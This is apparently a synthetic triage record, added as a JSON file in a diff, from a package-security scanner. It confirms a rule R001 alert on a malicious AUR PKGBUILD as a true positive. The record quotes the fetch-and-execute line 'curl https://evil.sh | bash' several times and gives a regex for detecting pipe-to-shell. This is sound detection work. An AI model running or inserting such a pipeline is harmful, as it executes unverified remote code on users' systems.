@@ -1,0 +1,45 @@
+{
+  "alert_slug": "synthetic/r001-tp",
+  "confidence": "high",
+  "overall": "TP",
+  "package": "malicious-pkg",
+  "rules": [
+    {
+      "agree": true,
+      "bad_practice_present": true,
+      "citation": "curl https://evil.sh | bash  (PKGBUILD source list, line ~12)",
+      "cited": true,
+      "class": "true_positive",
+      "confidence": "high",
+      "ioc_entries": [
+        {
+          "confidence": "high",
+          "provenance": "PKGBUILD source function line: `curl https://evil.sh | bash`",
+          "type": "domain",
+          "value": "evil.sh"
+        }
+      ],
+      "malicious_behaviour_present": true,
+      "malicious_citation": "curl https://evil.sh | bash",
+      "malicious_citation_grounded": true,
+      "malicious_reasoning": "The PKGBUILD fetches a script from an evil domain and pipes it directly to bash for execution during the build, which is actual malicious behavior (fetch-and-execute of unverified remote code).",
+      "reasoning": "The line pipes an unverified remote script from evil.sh directly into a shell, which is exactly the fetch-and-execute pattern R001 documents; this is genuine malice (a hardcoded 'evil' host), not a benign idiom that merely happens to match.",
+      "resolution": "This is a genuine malicious supply-chain attack, not a false positive. The build/install closure of the PKGBUILD executes `curl https://evil.sh | bash`, which fetches a remote script from evil.sh and pipes it directly into a shell for execution during package build (fetch-and-exec). Remedy: remove that line from the PKGBUILD source function; do not ship such a pipeline. To harden detection, keep R001 as an unescaped-pipe `curl.*\\|.*bash(sh)` matcher so the legitimate use of curl for fetching the declared tarball still does not trip it (it only matches when the pipe is unescaped and leads to a shell), while the malicious chain keeps firing.",
+      "rule_id": "R001",
+      "samples": [
+        [
+          "True",
+          "True"
+        ],
+        [
+          "True",
+          "True"
+        ]
+      ],
+      "tp_twin": "Any other AUR PKGBUILD that runs a fetched remote script directly in a shell without verification, e.g. `curl URL | sh` or `curl URL | python3`. That malicious pipe-to-shell case must keep firing.",
+      "where": "PKGBUILD source function (`build`/install closure, PKGBUILD line ~12); detection path: R001 rule card pattern in src/trustsight/analysis/composition.py (H043 fetch-and-exec family), unescaped-pipe `curl.*\\|.*bash(sh)`, fired on the pipeline at PKGBUILD line 12."
+    }
+  ],
+  "score": 80,
+  "score_threshold": 20
+}
